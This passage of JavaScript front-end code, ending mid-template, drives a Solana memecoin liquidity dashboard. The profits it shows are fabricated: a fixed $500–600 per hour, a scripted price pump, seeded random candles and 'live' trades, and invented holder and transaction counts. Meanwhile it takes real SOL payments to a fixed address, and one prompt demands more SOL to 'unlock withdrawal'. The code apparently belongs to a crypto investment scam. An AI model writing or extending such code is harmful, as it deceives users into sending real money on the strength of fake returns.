import { initApp, toast } from "./app.js";
import {
  loadPositions,
  saveAllPositions,
  addLiquidity,
  getPosition,
  removeLiquidityPct,
} from "./store.js";
import {
  PAY_ADDRESS,
  PAY_QR_SRC,
  confirmPayment,
  isLikelySig,
  lamportsToSol,
} from "./pay.js?v=18";

initApp();

const $ = (id) => document.getElementById(id);
const TICK_MS = 4000;
const TAPE_MAX = 12;
const CANDLES = 36;
const TF_OPTIONS = [
  { id: "1s", ms: 1000, label: "1s" },
  { id: "5s", ms: 5000, label: "5s" },
  { id: "15s", ms: 15000, label: "15s" },
  { id: "1m", ms: 60000, label: "1m" },
];
const DEFAULT_TF = "5s";
const SOL_USD_FALLBACK = 96;

let solUsd = SOL_USD_FALLBACK;
let positions = [];
let persistTimer = 0;
/** Currently opened detailed token mint, or "" for list view */
let activeMint = "";
/** @type {Map<string, string>} */
const tfByMint = new Map();
/** @type {Map<string, string>} */
const toolByMint = new Map();

function tfMsFor(mint) {
  const id = tfByMint.get(mint) || DEFAULT_TF;
  return TF_OPTIONS.find((t) => t.id === id)?.ms || 5000;
}

function tfLabelFor(mint) {
  return tfByMint.get(mint) || DEFAULT_TF;
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function shortAddr(addr) {
  if (!addr || addr.length < 12) return addr || "—";
  return addr.slice(0, 4) + "…" + addr.slice(-4);
}

function fmtNum(n, dig = 0) {
  return Number(n || 0).toLocaleString("en-US", {
    maximumFractionDigits: dig,
    minimumFractionDigits: dig > 0 ? Math.min(2, dig) : 0,
  });
}

function fmtUsd(n, signed = false) {
  const v = Number(n) || 0;
  const abs = Math.abs(v).toLocaleString("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2,
  });
  if (!signed) return abs;
  return (v >= 0 ? "+" : "−") + abs.replace("-", "");
}

function fmtSol(n, dig = 2) {
  return fmtNum(n, dig) + " SOL";
}

function ageLabel(ts) {
  const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 48) return h + "h ago";
  return new Date(ts).toLocaleDateString("en-US", { month: "short", day: "numeric" });
}

function hashStr(s) {
  let h = 2166136261;
  for (let i = 0; i < String(s).length; i++) {
    h ^= String(s).charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}

function mulberry32(a) {
  return function () {
    let t = (a += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** ~$500–600 profit per hour */
function hourlyUsdTarget(mint) {
  return 500 + (hashStr(mint) % 101); // 500–600 USD/hr
}

function supplyNum(pos) {
  return Number(String(pos.supply || "1000000000").replace(/,/g, "")) || 1e9;
}

function depositedSol(pos) {
  return Math.max(Number(pos.liquiditySol) || 0, 0.01);
}

/** Price in USD — flat start, then aggressive pump like the reference */
function tokenPriceUsd(pos, t) {
  const start = Number(pos.createdAt) || t;
  const hours = Math.max(0, (t - start) / 3_600_000);
  const seed = hashStr(pos.mint);
  const base = 0.0000012 + (seed % 800) / 1e10;
  // early flat, then moon
  const ramp = Math.pow(Math.max(0, hours * 1.85), 1.45);
  const wave = 1 + 0.08 * Math.sin(hours * 14 + (seed % 9));
  return Math.max(base * 0.2, base * (1 + ramp * 18) * wave);
}

function metrics(pos, now = Date.now()) {
  const start = Number(pos.createdAt) || now;
  const hours = Math.max(0, (now - start) / 3_600_000);
  // Start pooled SOL exactly at what the user deposited; grow from there
  const dep = depositedSol(pos);
  const rate = hourlyUsdTarget(pos.mint); // USD / hour
  const profitUsd = Math.max(0, hours * rate * (1 + 0.04 * Math.sin(hours * 6.2)));
  const profitSol = profitUsd / Math.max(solUsd, 1);
  const lpSol = dep + profitSol * 0.92;
  const lpUsd = lpSol * solUsd;
  const mult = lpSol / Math.max(dep, 0.01);
  const feesSol = Math.max(0.001, profitSol * 0.12 + hours * 0.04);
  const price = tokenPriceUsd(pos, now);
  const price0 = tokenPriceUsd(pos, start + 1000);
  const pct = ((price - price0) / Math.max(price0, 1e-12)) * 100;
  const mcap = price * supplyNum(pos);
  const vol = profitUsd * (4.2 + (hashStr(pos.mint) % 20) / 10) + dep * solUsd * 0.8;
  const txns = Math.floor(40 + hours * 720 + (hashStr(pos.mint) % 90));
  const holders = Math.floor(18 + hours * 310 + (hashStr(pos.mint + "h") % 40));
  const pooledTokens = supplyNum(pos) * 0.5;

  return {
    dep,
    profitUsd,
    profitSol,
    lpSol,
    lpUsd,
    mult,
    feesSol,
    price,
    pct,
    mcap,
    vol,
    txns,
    holders,
    pooledTokens,
    rate,
  };
}

function tinyPrice(n) {
  if (!Number.isFinite(n) || n <= 0) return "$0";
  if (n >= 0.01) return "$" + n.toFixed(4);
  // $0.0₅159 style
  const s = n.toFixed(12).replace(/0+$/, "");
  const m = s.match(/^0\.(0+)([1-9]\d{0,3})/);
  if (!m) return "$" + n.toExponential(2);
  const zeros = m[1].length;
  const digs = m[2].slice(0, 4);
  if (zeros >= 2) return `$0.0<sub>${zeros}</sub>${digs}`;
  return "$" + n.toFixed(Math.min(8, zeros + 4));
}

function buildCandles(pos, now) {
  const start = Number(pos.createdAt) || now;
  const count = CANDLES;
  const tfMs = tfMsFor(pos.mint);
  // buckets by selected timeframe; stretch early life so chart still fills
  const life = Math.max(now - start, tfMs * 8);
  const step = Math.max(tfMs, life / count);
  const candles = [];
  for (let i = 0; i < count; i++) {
    const t0 = now - step * (count - i);
    const t1 = t0 + step;
    const mid = (t0 + t1) / 2;
    const baseOpen = tokenPriceUsd(pos, Math.max(start, t0));
    const baseClose = tokenPriceUsd(pos, Math.min(now, t1));
    const rnd = mulberry32(hashStr(pos.mint + ":cd:" + Math.floor(t0 / step)));
    const anchor = Math.max(baseOpen, baseClose, 1e-12);
    // Red/green candles track sell/buy mix: ~20% sell (red) / ~80% buy (green)
    const bear = rnd() < 0.2;
    let open;
    let close;
    if (bear) {
      const drop = 0.018 + rnd() * 0.055;
      open = anchor * (1 + rnd() * 0.012);
      close = open * (1 - drop);
    } else {
      const lift = 0.012 + rnd() * 0.05;
      open = Math.min(baseOpen, baseClose) * (1 - rnd() * 0.01);
      close = Math.max(open, anchor * (1 + lift * 0.35), open * (1 + lift));
    }
    const swing = Math.abs(close - open);
    const wiggle = Math.max(swing * 0.9, open * 0.035 * (0.35 + rnd()));
    const high = Math.max(open, close) + wiggle * (0.35 + rnd() * 0.5);
    const low = Math.max(1e-12, Math.min(open, close) - wiggle * (0.4 + rnd() * 0.55));
    const up = close >= open;
    const vol = (8 + rnd() * 40) * (up ? 1.2 : 0.95) * (1 + i / count);
    candles.push({ open, high, low, close, vol, up, t0, t1, mid });
  }
  return candles;
}

function chartShellHtml(pos, candles, price) {
  const tf = tfLabelFor(pos.mint);
  const tool = toolByMint.get(pos.mint) || "cross";
  const sym = pos.symbol || "TOKEN";
  const tfs = TF_OPTIONS.map(
    (t) =>
      `<button type="button" class="liq-tf${t.id === tf ? " is-on" : ""}" data-tf="${t.id}" data-mint="${escapeHtml(pos.mint)}">${t.label}</button>`
  ).join("");
  const tools = [
    ["cross", "Crosshair", "M4 12h16M12 4v16"],
    ["trend", "Trend line", "M5 19L19 5"],
    ["hline", "Horizontal line", "M3 12h18"],
    ["fib", "Measure", "M6 5v14M12 5v14M18 5v14"],
    ["rect", "Rectangle", "M5 7h14v10H5z"],
    ["note", "Notes", "M6 8h12M6 12h10M6 16h8"],
    ["lock", "Lock drawings", "M8 11V8a4 4 0 0 1 8 0v3M7 11h10v9H7z"],
    ["eye", "Hide drawings", "M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Zm10 3a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"],
    ["trash", "Clear drawings", "M5 7h14M9 7V5h6v2m-7 3v8m4-8v8m4-8v8M7 7l1 12h8l1-12"],
  ]
    .map(
      ([id, title, d]) =>
        `<button type="button" class="liq-tool${id === tool ? " is-on" : ""}" data-tool="${id}" data-mint="${escapeHtml(pos.mint)}" title="${title}" aria-label="${title}">
          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="${d}" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>`
    )
    .join("");

  return `
    <div class="liq-chart-bar">
      <div class="liq-tfs" role="group" aria-label="Chart timeframe">${tfs}
        <button type="button" class="liq-ind" data-ind="${escapeHtml(pos.mint)}" title="Indicators">
          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 18V10M10 18V6M16 18v-5M20 18H3" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
          Indicators
        </button>
      </div>
      <div class="liq-chart-meta">
        <span data-pair>${escapeHtml(sym)}/SOL on Raydium · ${escapeHtml(tf)} · memelaunchpad</span>
        <span data-ohlc>${ohlcLine(candles, sym)}</span>
      </div>
    </div>
    <div class="liq-chart-stage">
      <div class="liq-tools" role="toolbar" aria-label="Chart tools">${tools}</div>
      <div class="liq-chart is-tool-${tool}" data-chart>${chartSvg(candles, price)}</div>
    </div>`;
}

function chartSvg(candles, lastPrice) {
  if (!candles.length) return "";
  const W = 640;
  const H = 280;
  const volH = 52;
  const padL = 8;
  const padR = 64;
  const padT = 12;
  const padB = 8;
  const plotH = H - volH - padT - padB;
  const plotW = W - padL - padR;

  let minP = Infinity;
  let maxP = -Infinity;
  let maxV = 0;
  for (const c of candles) {
    minP = Math.min(minP, c.low);
    maxP = Math.max(maxP, c.high);
    maxV = Math.max(maxV, c.vol);
  }
  const span = Math.max(maxP - minP, maxP * 0.05, 1e-12);
  minP -= span * 0.08;
  maxP += span * 0.12;

  const yOf = (p) => padT + (1 - (p - minP) / (maxP - minP)) * plotH;
  const gap = 2;
  const cw = Math.max(3, plotW / candles.length - gap);

  const bodies = candles
    .map((c, i) => {
      const x = padL + i * (cw + gap) + cw / 2;
      const yO = yOf(c.open);
      const yC = yOf(c.close);
      const yH = yOf(c.high);
      const yL = yOf(c.low);
      const top = Math.min(yO, yC);
      const bh = Math.max(1.5, Math.abs(yC - yO));
      const cls = c.up ? "up" : "dn";
      const volY = H - padB - (c.vol / maxV) * (volH - 10);
      return `
        <line class="wick ${cls}" x1="${x}" x2="${x}" y1="${yH}" y2="${yL}" />
        <rect class="body ${cls}" x="${x - cw / 2}" y="${top}" width="${cw}" height="${bh}" />
        <rect class="vbar ${cls}" x="${x - cw / 2}" y="${volY}" width="${cw}" height="${H - padB - volY}" />`;
    })
    .join("");

  // price axis ticks
  const ticks = [];
  for (let i = 0; i < 5; i++) {
    const p = maxP - ((maxP - minP) * i) / 4;
    const y = yOf(p);
    ticks.push(`
      <line class="grid" x1="${padL}" x2="${W - padR}" y1="${y}" y2="${y}" />
      <text class="axis" x="${W - padR + 6}" y="${y + 3}">${axisLabel(p)}</text>`);
  }

  const lastY = yOf(lastPrice);
  const badge = `
    <rect class="px-badge" x="${W - padR + 2}" y="${lastY - 9}" width="58" height="18" rx="3" />
    <text class="px-badge-t" x="${W - padR + 31}" y="${lastY + 3}">${axisLabel(lastPrice)}</text>
    <line class="px-line" x1="${padL}" x2="${W - padR}" y1="${lastY}" y2="${lastY}" />`;

  return `
    <svg class="liq-chart-svg" viewBox="0 0 ${W} ${H}" preserveAspectRatio="none" aria-hidden="true">
      <line class="vol-sep" x1="${padL}" x2="${W - padR}" y1="${padT + plotH + 4}" y2="${padT + plotH + 4}" />
      ${ticks.join("")}
      ${bodies}
      ${badge}
    </svg>`;
}

function axisLabel(p) {
  if (p >= 0.01) return p.toFixed(4);
  if (p >= 0.0001) return p.toFixed(6);
  return p.toExponential(1).replace("e-", "e-");
}

function ensureSim(pos) {
  if (!pos.sim) pos.sim = { trades: [], lastTick: pos.createdAt || Date.now() };
  if (!Array.isArray(pos.sim.trades)) pos.sim.trades = [];
  return pos;
}

function makeTrade(pos, t) {
  const rnd = mulberry32(hashStr(pos.mint + ":" + Math.floor(t / 1000)));
  // Tape mix: ~80% BUY / ~20% SELL
  const side = rnd() < 0.2 ? "sell" : "buy";
  const usd = 6 + rnd() * 55 + (side === "buy" ? rnd() * 25 : rnd() * 12);
  return {
    id: hashStr(pos.mint + t + side + usd).toString(36),
    t,
    side,
    usd: Math.round(usd * 100) / 100,
    tokens: Math.floor((50_000 + rnd() * 500_000) * (0.5 + rnd())),
  };
}

function backfillTrades(pos, now) {
  ensureSim(pos);
  if (pos.sim.trades.length >= 3) return pos;
  const start = Number(pos.createdAt) || now;
  const trades = [];
  let t = start + 8_000;
  let i = 0;
  while (t < now && trades.length < 60) {
    const rnd = mulberry32(hashStr(pos.mint + ":bf:" + i));
    trades.push(makeTrade(pos, t));
    t += 15_000 + Math.floor(rnd() * 50_000);
    i++;
  }
  pos.sim.trades = trades.slice(-TAPE_MAX);
  pos.sim.lastTick = now;
  return pos;
}

function tickTrade(pos, now) {
  ensureSim(pos);
  if (now - (pos.sim.lastTick || 0) < TICK_MS - 200) return pos;
  pos.sim.trades = [...pos.sim.trades, makeTrade(pos, now)].slice(-TAPE_MAX);
  pos.sim.lastTick = now;
  return pos;
}

function tapeHtml(trades, symbol) {
  const rows = [...(trades || [])].reverse().slice(0, TAPE_MAX);
  if (!rows.length) return `<div class="liq-tape-empty">Waiting for first fills…</div>`;
  return rows
    .map((tr) => {
      const ago = Math.max(0, Math.floor((Date.now() - tr.t) / 1000));
      const when = ago < 60 ? ago + "s" : Math.floor(ago / 60) + "m";
      const side = tr.side === "sell" ? "sell" : "buy";
      return `<div class="liq-tape-row is-${side}">
        <span class="liq-tape-side">${side === "sell" ? "SELL" : "BUY"}</span>
        <span class="liq-tape-amt">${fmtUsd(tr.usd)}</span>
        <span class="liq-tape-qty">${fmtNum(tr.tokens)} ${escapeHtml(symbol || "")}</span>
        <span class="liq-tape-time">${when}</span>
      </div>`;
    })
    .join("");
}

function ohlcLine(candles, symbol) {
  const c = candles[candles.length - 1];
  if (!c) return "";
  const cls = c.up ? "up" : "dn";
  return `<span class="liq-ohlc ${cls}">O <b>${axisLabel(c.open)}</b> · H <b>${axisLabel(c.high)}</b> · L <b>${axisLabel(c.low)}</b> · C <b>${axisLabel(c.close)}</b></span>`;
}

function rowHtml(p) {
  const now = Date.now();
  const m = metrics(p, now);
  const sym = p.symbol || "TOKEN";
  const logo = p.logo
    ? `<span class="liq-logo has-image"><img src="${escapeHtml(p.logo)}" alt=""></span>`
    : `<span class="liq-logo">${escapeHtml(sym.slice(0, 1))}</span>`;

  return `
  <button type="button" class="liq-row" data-open-token="${escapeHtml(p.mint)}">
    <div class="liq-row-left">
      ${logo}
      <div class="liq-id">
        <div class="liq-name">${escapeHtml(p.name || "Token")}</div>
        <div class="liq-pair">$${escapeHtml(sym)} / SOL</div>
      </div>
    </div>
    <div class="liq-row-mid">
      <div><span>Pooled SOL</span><b data-poolsol>${fmtNum(m.lpSol, 2)} SOL</b></div>
      <div><span>Pooled tokens</span><b data-pooltok>${fmtCompact(m.pooledTokens)} ${escapeHtml(sym)}</b></div>
      <div><span>Created</span><b>${ageLabel(p.createdAt || now)}</b></div>
    </div>
    <div class="liq-row-right">
      <span class="liq-live"><i></i> Live</span>
      <span class="btn btn-shine btn-sm liq-row-manage" data-manage="${escapeHtml(p.mint)}">Manage</span>
      <span class="liq-row-chev" aria-hidden="true">▾</span>
    </div>
  </button>`;
}

function detailHtml(p) {
  const now = Date.now();
  const m = metrics(p, now);
  const candles = buildCandles(p, now);
  const sym = p.symbol || "TOKEN";
  const logo = p.logo
    ? `<span class="liq-logo has-image"><img src="${escapeHtml(p.logo)}" alt=""></span>`
    : `<span class="liq-logo">${escapeHtml(sym.slice(0, 1))}</span>`;

  return `
  <article class="liq-card" data-mint="${escapeHtml(p.mint)}">
    <div class="liq-detail-nav">
      <button type="button" class="btn btn-ghost btn-sm" data-back-list>← All positions</button>
      <button type="button" class="btn btn-shine btn-sm" data-manage="${escapeHtml(p.mint)}">Manage</button>
    </div>
    <div class="liq-head">
      <div class="liq-head-left">
        ${logo}
        <div class="liq-id">
          <div class="liq-name">${escapeHtml(p.name || "Token")}</div>
          <div class="liq-pair">$${escapeHtml(sym)} / SOL</div>
        </div>
      </div>
      <div class="liq-head-mid">
        <div><span>Pooled SOL</span><b data-poolsol>${fmtNum(m.lpSol, 2)}</b></div>
        <div><span>Pooled tokens</span><b data-pooltok>${fmtCompact(m.pooledTokens)} ${escapeHtml(sym)}</b></div>
        <div><span>Created</span><b>${ageLabel(p.createdAt || now)}</b></div>
      </div>
      <div class="liq-head-right">
        <span class="liq-live"><i></i> Live</span>
      </div>
    </div>

    <div class="liq-kpis">
      <div class="liq-kpi">
        <b class="liq-kpi-mult" data-mult>${fmtNum(m.mult, 2)}x</b>
        <span class="liq-kpi-sub is-gain" data-net>+${fmtNum(m.profitSol, 2)} SOL (${fmtUsd(m.profitUsd, true)}) net, on ${fmtNum(m.dep, 2)} SOL deposited</span>
      </div>
      <div class="liq-kpi">
        <span class="liq-kpi-label">LP SOL value</span>
        <b data-lpusd>${fmtUsd(m.lpUsd)}</b>
        <span class="liq-kpi-sub" data-lpsol>${fmtNum(m.lpSol, 2)} SOL</span>
      </div>
      <div class="liq-kpi">
        <span class="liq-kpi-label">Fees earned</span>
        <b data-fees>${fmtNum(m.feesSol, 4)} SOL</b>
        <span class="liq-kpi-sub">${fmtUsd(m.feesSol * solUsd)}</span>
      </div>
      <div class="liq-kpi">
        <span class="liq-kpi-label">Current price</span>
        <b data-price>${tinyPrice(m.price)}</b>
        <span class="liq-kpi-sub is-gain" data-pct>${m.pct >= 0 ? "+" : ""}${fmtNum(m.pct, 2)}% since launch</span>
      </div>
    </div>

    <div class="liq-mkt">
      <span>Market cap <b data-mcap>${fmtCompactUsd(m.mcap)}</b></span>
      <span>Volume <b data-vol>${fmtCompactUsd(m.vol)}</b></span>
      <span>Transactions <b data-tx>${fmtNum(m.txns)}</b></span>
      <span>Holders <b data-hold>${fmtNum(m.holders)}</b></span>
    </div>

    <div class="liq-chart-wrap">
      ${chartShellHtml(p, candles, m.price)}
    </div>

    <div class="liq-tape-head"><span>Live fills</span><span class="liq-tape-hint">buys / sells</span></div>
    <div class="liq-tape" data-tape>${tapeHtml(p.sim?.trades || [], sym)}</div>

    <div class="liq-meta-row">
      <button type="button" class="liq-mint" data-copy="${escapeHtml(p.mint)}" title="${escapeHtml(p.mint)}">
        Mint ${shortAddr(p.mint)} <svg class="icon"><use href="#i-copy"/></svg>
      </button>
      ${p.mmVolume > 0 ? `<span class="liq-chip">${escapeHtml(String(p.mmVolume))} SOL bot</span>` : ""}
    </div>
  </article>`;
}

function fmtCompact(n) {
  const v = Number(n) || 0;
  if (v >= 1e9) return (v / 1e9).toFixed(2) + "B";
  if (v >= 1e6) return (v / 1e6).toFixed(2) + "M";
  if (v >= 1e3) return (v / 1e3).toFixed(1) + "K";
  return fmtNum(v);
}

function fmtCompactUsd(n) {
  const v = Number(n) || 0;
  if (v >= 1e6) return "$" + (v / 1e6).toFixed(1) + "M";
  if (v >= 1e3) return "$" + (v / 1e3).toFixed(1) + "K";
  return fmtUsd(v);
}

function syncFromStore() {
  positions = loadPositions().map((p) => backfillTrades({ ...p }, Date.now()));
}

function render() {
  const empty = $("liqEmpty");
  const listEl = $("liqList");
  const more = $("liqCreateAnother");
  if (!empty || !listEl) return;
  if (!positions.length) {
    activeMint = "";
    empty.hidden = false;
    listEl.hidden = true;
    listEl.innerHTML = "";
    if (more) more.hidden = true;
    return;
  }
  empty.hidden = true;
  listEl.hidden = false;

  // If active token was removed, fall back to list
  if (activeMint && !positions.some((p) => p.mint === activeMint)) activeMint = "";

  if (activeMint) {
    const pos = positions.find((p) => p.mint === activeMint);
    listEl.className = "liq-list is-detail";
    listEl.innerHTML = pos ? detailHtml(pos) : "";
    if (more) more.hidden = true;
  } else {
    listEl.className = "liq-list is-rows";
    listEl.innerHTML = positions.map(rowHtml).join("");
    if (more) more.hidden = false;
  }
}

function softUpdate() {
  const now = Date.now();
  positions = positions.map((p) => tickTrade({ ...p }, now));

  if (!activeMint) {
    // Compact list: refresh pooled numbers / age lightly
    positions.forEach((p) => {
      const row = document.querySelector(`.liq-row[data-open-token="${CSS.escape(p.mint)}"]`);
      if (!row) return;
      const m = metrics(p, now);
      const setText = (sel, text) => {
        const el = row.querySelector(sel);
        if (el) el.textContent = text;
      };
      setText("[data-poolsol]", `${fmtNum(m.lpSol, 2)} SOL`);
      setText("[data-pooltok]", `${fmtCompact(m.pooledTokens)} ${p.symbol || "TOKEN"}`);
    });
  } else {
    const card = document.querySelector(`.liq-card[data-mint="${CSS.escape(activeMint)}"]`);
    const p = positions.find((x) => x.mint === activeMint);
    if (card && p) {
      const m = metrics(p, now);
      const candles = buildCandles(p, now);
      const set = (sel, html) => {
        const el = card.querySelector(sel);
        if (el) el.innerHTML = html;
      };
      const setText = (sel, text) => {
        const el = card.querySelector(sel);
        if (el) el.textContent = text;
      };
      setText("[data-mult]", fmtNum(m.mult, 2) + "x");
      setText(
        "[data-net]",
        `+${fmtNum(m.profitSol, 2)} SOL (${fmtUsd(m.profitUsd, true)}) net, on ${fmtNum(m.dep, 2)} SOL deposited`
      );
      setText("[data-poolsol]", fmtNum(m.lpSol, 2));
      setText("[data-pooltok]", `${fmtCompact(m.pooledTokens)} ${p.symbol || "TOKEN"}`);
      setText("[data-lpusd]", fmtUsd(m.lpUsd));
      setText("[data-lpsol]", fmtNum(m.lpSol, 2) + " SOL");
      setText("[data-fees]", fmtNum(m.feesSol, 4) + " SOL");
      set("[data-price]", tinyPrice(m.price));
      setText("[data-pct]", `${m.pct >= 0 ? "+" : ""}${fmtNum(m.pct, 2)}% since launch`);
      setText("[data-mcap]", fmtCompactUsd(m.mcap));
      setText("[data-vol]", fmtCompactUsd(m.vol));
      setText("[data-tx]", fmtNum(m.txns));
      setText("[data-hold]", fmtNum(m.holders));
      set("[data-ohlc]", ohlcLine(candles, p.symbol));
      setText("[data-pair]", `${p.symbol || "TOKEN"}/SOL on Raydium · ${tfLabelFor(p.mint)} · memelaunchpad`);
      set("[data-chart]", chartSvg(candles, m.price));
      set("[data-tape]", tapeHtml(p.sim?.trades || [], p.symbol));
    }
  }

  // Only persist when we still have positions — never wipe store with []
  clearTimeout(persistTimer);
  if (!positions.length) return;
  persistTimer = setTimeout(() => {
    if (!positions.length) return;
    const fromStore = loadPositions();
    const bare = positions.map(({ sim, ...rest }) => {
      // keep logo from disk if in-memory copy was stripped / missing
      const prev = fromStore.find((x) => x.mint === rest.mint);
      if ((!rest.logo || rest.logo.length < 8) && prev?.logo) {
        return { ...rest, logo: prev.logo };
      }
      return rest;
    });
    // Merge: keep any store-only mints we didn't have in memory
    const memMints = new Set(bare.map((p) => p.mint));
    for (const p of fromStore) {
      if (!memMints.has(p.mint)) bare.push(p);
    }
    saveAllPositions(bare);
  }, 900);
}

async function refreshSol() {
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 4000);
    const r = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT", {
      cache: "no-store",
      signal: ctrl.signal,
    });
    clearTimeout(t);
    const j = await r.json();
    const n = Number(j?.price);
    if (Number.isFinite(n) && n > 0) solUsd = n;
  } catch {}
}

/* —— Add liquidity modal —— */
/* Real on-chain payment verification */
const DEMO_SKIP_PAY = false;

const addModal = $("addLiqModal");
let addMint = "";
let addBusy = false;
let addPoll = 0;
let addAmount = 1;

function setAddUi({ error = "", status = "" } = {}) {
  const err = $("addLiqError");
  const st = $("addLiqStatus");
  if (err) {
    err.hidden = !error;
    err.textContent = error || "";
  }
  if (st) {
    st.hidden = !status;
    st.textContent = status || "";
  }
}

function syncAddAmount() {
  const custom = parseFloat($("addLiqCustom")?.value || "");
  if (Number.isFinite(custom) && custom > 0) {
    addAmount = custom;
    document.querySelectorAll("#addLiqPresets .preset[data-add-liq]").forEach((b) => b.classList.remove("is-on"));
  } else {
    const on = document.querySelector("#addLiqPresets .preset.is-on[data-add-liq]");
    addAmount = parseFloat(on?.getAttribute("data-add-liq") || "1") || 1;
  }
  if ($("addLiqAmount")) $("addLiqAmount").textContent = addAmount.toFixed(2);
  setAddUi({
    status: `Waiting for ≥ ${addAmount.toFixed(2)} SOL to ${shortAddr(PAY_ADDRESS)} (last 10 min)…`,
  });
}

function openAddLiq(mint, opts = {}) {
  const pos = getPosition(mint) || positions.find((p) => p.mint === mint);
  if (!pos) return;
  addMint = mint;
  const forced = Number(opts.amount);
  const hasForced = Number.isFinite(forced) && forced > 0;
  if ($("addLiqSub")) {
    $("addLiqSub").textContent = hasForced
      ? `Add ${forced.toFixed(0)} SOL to unlock withdrawal for ${pos.name || pos.symbol || "token"}.`
      : `Top up ${pos.name || pos.symbol || "token"} pool with more SOL.`;
  }
  if ($("addLiqAddress")) $("addLiqAddress").textContent = PAY_ADDRESS;
  if ($("addLiqTx")) $("addLiqTx").value = "";
  if (hasForced) {
    if ($("addLiqCustom")) $("addLiqCustom").value = String(forced);
    document.querySelectorAll("#addLiqPresets .preset[data-add-liq]").forEach((b) => b.classList.remove("is-on"));
  } else {
    if ($("addLiqCustom")) $("addLiqCustom").value = "";
    document.querySelectorAll("#addLiqPresets .preset[data-add-liq]").forEach((b) => {
      b.classList.toggle("is-on", b.getAttribute("data-add-liq") === "1");
    });
  }
  const qr = $("addLiqQr")?.querySelector("img");
  if (qr) qr.src = PAY_QR_SRC;
  syncAddAmount();
  addModal?.classList.add("open");
  clearInterval(addPoll);
  addPoll = setInterval(() => {
    if (addBusy || !addModal?.classList.contains("open")) return;
    tryAddPayment({ silent: true });
  }, 8000);
  if (DEMO_SKIP_PAY) {
    setAddUi({ status: "Test mode: adding to pool without on-chain check…" });
    setTimeout(() => tryAddPayment({ silent: false }), 280);
  }
}

function closeAddLiq() {
  if (addBusy) return;
  clearInterval(addPoll);
  addPoll = 0;
  addModal?.classList.remove("open");
  addMint = "";
}

function creditAddLiquidity(addSol) {
  const amt = Number(addSol) || 0;
  if (!(amt > 0) || !addMint) return null;
  const updated = addLiquidity(addMint, amt);
  if (!updated) return null;
  positions = positions.map((p) => (p.mint === addMint ? { ...updated, sim: p.sim } : p));
  // keep store in sync immediately
  const bare = positions.map(({ sim, ...rest }) => rest);
  saveAllPositions(bare);
  return updated;
}

async function tryAddPayment({ silent = false } = {}) {
  if (addBusy || !addMint) return;
  syncAddAmount();
  const pasted = ($("addLiqTx")?.value || "").trim();
  if (!DEMO_SKIP_PAY && pasted && !isLikelySig(pasted)) {
    if (!silent) setAddUi({ error: "Invalid signature — or leave empty to auto-scan" });
    return;
  }
  if (!silent) {
    setAddUi({ status: DEMO_SKIP_PAY ? "Adding to pool (test mode)…" : "Checking Solana for payment…" });
    if ($("addLiqCheck")) $("addLiqCheck").disabled = true;
  }
  try {
    let result;
    if (DEMO_SKIP_PAY) {
      result = {
        ok: true,
        sol: addAmount,
        lamports: Math.floor(addAmount * 1e9),
      };
    } else {
      result = await confirmPayment(addAmount, pasted);
    }
    if (!result.ok) {
      if (!silent) setAddUi({ error: result.reason || "Payment not found" });
      else {
        setAddUi({
          status: `Watching wallet… need ≥ ${addAmount.toFixed(2)} SOL (last 10 min)`,
        });
      }
      return;
    }

    addBusy = true;
    // Credit the selected top-up amount into this token's pool
    const addSol = DEMO_SKIP_PAY ? addAmount : Number(result.sol) || addAmount;
    const updated = creditAddLiquidity(addSol);
    if (updated) {
      toast(`+${addSol.toFixed(2)} SOL added to pool · now ${fmtNum(updated.liquiditySol, 2)} SOL`);
      setAddUi({
        status: `Added ${addSol.toFixed(2)} SOL to liquidity`,
      });
      render();
      setTimeout(() => {
        addBusy = false;
        closeAddLiq();
      }, 500);
    } else {
      addBusy = false;
      setAddUi({ error: "Position not found" });
    }
  } catch (err) {
    console.error(err);
    if (!silent) setAddUi({ error: "Could not reach Solana RPC — try again" });
  } finally {
    if (!silent && $("addLiqCheck")) $("addLiqCheck").disabled = false;
  }
}

const manageModal = $("manageModal");
const removeModal = $("removeModal");
let manageMint = "";
let removePct = 100;
let removeBusy = false;
let lastWithdrawn = 0;

function showRemovePane(which) {
  if ($("removePaneForm")) $("removePaneForm").hidden = which !== "form";
  if ($("removePaneProgress")) $("removePaneProgress").hidden = which !== "progress";
  if ($("removePaneDone")) $("removePaneDone").hidden = which !== "done";
}

function openManage(mint) {
  const pos = getPosition(mint) || positions.find((p) => p.mint === mint);
  if (!pos) return;
  manageMint = mint;
  const now = Date.now();
  const m = metrics(pos, now);
  const sym = pos.symbol || "TOKEN";
  if ($("manageName")) $("manageName").textContent = pos.name || sym;
  if ($("managePair")) $("managePair").textContent = `$${sym} / SOL`;
  if ($("manageLogo")) {
    if (pos.logo) {
      $("manageLogo").classList.add("has-image");
      $("manageLogo").innerHTML = `<img src="${escapeHtml(pos.logo)}" alt="">`;
    } else {
      $("manageLogo").classList.remove("has-image");
      $("manageLogo").textContent = sym.slice(0, 1);
    }
  }
  if ($("manageBotTag")) {
    $("manageBotTag").textContent = pos.mmVolume > 0 ? `${pos.mmVolume} SOL bot` : "Volume bot";
    $("manageBotTag").classList.toggle("is-on", Number(pos.mmVolume) > 0);
  }
  if ($("manageFacts")) {
    const paid = (Number(pos.liquiditySol) || 0) + (Number(pos.mmVolume) || 0) + 0.1;
    $("manageFacts").innerHTML = `
      <li><span>Pooled SOL</span><b>${fmtNum(m.lpSol, 2)} SOL</b></li>
